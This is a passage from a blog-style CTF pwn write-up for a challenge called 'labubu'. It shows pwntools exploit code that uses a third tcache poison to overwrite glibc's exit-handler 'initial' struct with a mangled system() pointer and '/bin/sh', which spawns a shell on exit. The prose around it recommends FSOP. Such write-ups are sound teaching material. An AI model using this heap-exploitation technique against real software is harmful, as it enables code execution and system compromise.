<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>libc <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#34;./libc.so.6&#34;</span>)
</span></span><span style="display:flex;"><span>initial_offset <span style="color:#f92672">=</span> libc<span style="color:#f92672">.</span>sym[<span style="color:#e6db74">&#39;initial&#39;</span>] <span style="color:#f92672">+</span> <span style="color:#ae81ff">16</span> <span style="color:#75715e">#16 for alignment</span>
</span></span><span style="display:flex;"><span>initial <span style="color:#f92672">=</span> base <span style="color:#f92672">+</span> initial_offset
</span></span><span style="display:flex;"><span>system <span style="color:#f92672">=</span> base <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x000000000005c110</span>
</span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;this is system </span><span style="color:#e6db74">{</span>hex(system)<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
</span></span><span style="display:flex;"><span>context<span style="color:#f92672">.</span>binary <span style="color:#f92672">=</span> libc <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#34;./libc.so.6&#34;</span>)
</span></span><span style="display:flex;"><span>binsh_offset <span style="color:#f92672">=</span> next(libc<span style="color:#f92672">.</span>search(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;/bin/sh&#34;</span>))
</span></span><span style="display:flex;"><span>binsh <span style="color:#f92672">=</span> base <span style="color:#f92672">+</span> binsh_offset
</span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;this is binsh </span><span style="color:#e6db74">{</span>hex(binsh)<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
</span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;this is initial+16 </span><span style="color:#e6db74">{</span>hex(initial)<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
</span></span><span style="display:flex;"><span>mangled_system <span style="color:#f92672">=</span> (system <span style="color:#f92672">&lt;&lt;</span> <span style="color:#ae81ff">17</span>)
</span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;this is mangled system </span><span style="color:#e6db74">{</span>hex(mangled_system)<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">=</span> p64(<span style="color:#ae81ff">4</span>) <span style="color:#f92672">+</span> p64(mangled_system) <span style="color:#f92672">+</span> p64(binsh)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">#third poison</span>
</span></span><span style="display:flex;"><span>free(<span style="color:#ae81ff">4</span>)
</span></span><span style="display:flex;"><span>free(<span style="color:#ae81ff">0</span>)
</span></span><span style="display:flex;"><span>edit(<span style="color:#ae81ff">0</span>, p64(mangle(heapleak, initial)))
</span></span><span style="display:flex;"><span>alloc(<span style="color:#ae81ff">4</span>)
</span></span><span style="display:flex;"><span>alloc(<span style="color:#ae81ff">0</span>)
</span></span><span style="display:flex;"><span>edit(<span style="color:#ae81ff">0</span>, payload)
</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;5&#34;</span>)
</span></span></code></pre></div><p>Here you can see that the function is overwritten to system.</p>
<p><img src="/post/labubu/images/after_initial_overwrite.jpeg" alt="after_initial_overwrite"></p>
<p>We have to perform a third tcache poison to then overwrite the <code>initial</code> struct and then exit to trigger the exit handlers.</p>
<p><img src="/post/labubu/images/exit_handlers_win.jpeg" alt="exit_handlers_win"></p>
<p>This method is even more inefficient as I have to tcache poison 3 times in total as well as get a <strong>ton</strong> more leaks. SO FOR THE SWEET LOVE OF GOD JUST USE FSOP. Thank you.</p>
<p>Stop using jippity to hallucinate answers for pwn!!!</p>
<p><a href="https://github.com/Waheyy/challenges/tree/main/labubu">Here are the full scripts and files for this challenge.</a></p>

    <h4><a href="http://localhost:1313/">Back to Home</a></h4>
</div>


        </div><footer class="container">
    <hr class="soften">
    <p>
&copy; 

    Waheyy

<span id="thisyear">2026</span>


        | Built on <a href="//gohugo.io" target="_blank">Hugo</a>

</p>
    <p class="text-center">
        
        
        
        <a href="https://github.com/Waheyy">GitHub</a> 
        
    </p>
</footer>

</body><link rel="stylesheet" href="/css/bootstrap.css">
<link rel="stylesheet" href="/css/bootstrap-responsive.css">
<link rel="stylesheet" href="/css/style.css">

<script src="/js/jquery.js"></script>
<script src="/js/bootstrap-386.js"></script>
<script src="/js/bootstrap-transition.js"></script>
<script src="/js/bootstrap-alert.js"></script>
<script src="/js/bootstrap-modal.js"></script>
<script src="/js/bootstrap-dropdown.js"></script>
<script src="/js/bootstrap-scrollspy.js"></script>
<script src="/js/bootstrap-tab.js"></script>
<script src="/js/bootstrap-tooltip.js"></script>
<script src="/js/bootstrap-popover.js"></script>
<script src="/js/bootstrap-button.js"></script>
<script src="/js/bootstrap-collapse.js"></script>
<script src="/js/bootstrap-carousel.js"></script>
<script src="/js/bootstrap-typeahead.js"></script>
<script src="/js/bootstrap-affix.js"></script>
<script>
    _386 = { 
        fastLoad: false ,
        onePass: false , 
        speedFactor: 1 
    };

    
    function ThisYear() {
        document.getElementById('thisyear').innerHTML = new Date().getFullYear();
    };
</script>
</html>
